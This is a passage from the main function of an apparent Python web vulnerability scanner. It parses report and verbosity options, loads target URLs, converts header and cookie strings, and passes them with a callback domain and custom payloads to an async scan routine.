    output_group = parser.add_argument_group('Output')
    output_group.add_argument('-o', '--output', help='Output file for the report')
    output_group.add_argument('--format', choices=['json', 'html', 'xml'], default='json',
                            help='Report format (default: json)')
    output_group.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Check for target
    if not args.url and not args.file:
        parser.error('No target specified. Use -u/--url or -f/--file')
    
    # Set up logging level
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Print banner
    print(BANNER)
    
    # Get URLs to scan
    urls = []
    if args.url:
        urls.append(args.url)
    if args.file:
        try:
            file_urls = load_urls_from_file(args.file)
            urls.extend(file_urls)
            logger.info(f"Loaded {len(file_urls)} URLs from {args.file}")
        except Exception as e:
            logger.error(f"Error loading URLs from file: {e}")
    
    # Convert headers list to dict
    headers = {}
    if args.header:
        for header in args.header:
            try:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
            except ValueError:
                logger.warning(f"Invalid header format: {header}. Should be 'Name: Value'")
    
    # Convert cookies string to dict
    cookies = {}
    if args.cookie:
        try:
            for cookie in args.cookie.split(';'):
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
        except ValueError:
            logger.warning(f"Invalid cookie format: {args.cookie}. Should be 'name1=value1; name2=value2'")
    
    # Run scan
    try:
        report = await scan_url_list(
            urls=urls,
            techniques=args.techniques,
            callback_domain=args.callback_domain,
            proxy=args.proxy,
            headers=headers,
            cookies=cookies,
            output_file=args.output,
            report_format=args.format,
            custom_payloads=args.custom_payloads,
            timeout=args.timeout
        )
        
        if not args.output:
            print(report)
        
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
    except Exception as e:
        logger.error(f"Error during scan: {e}")
        logger.debug("Exception details:", exc_info=True)

if __name__ == "__main__":
    asyncio.run(main())

                                                    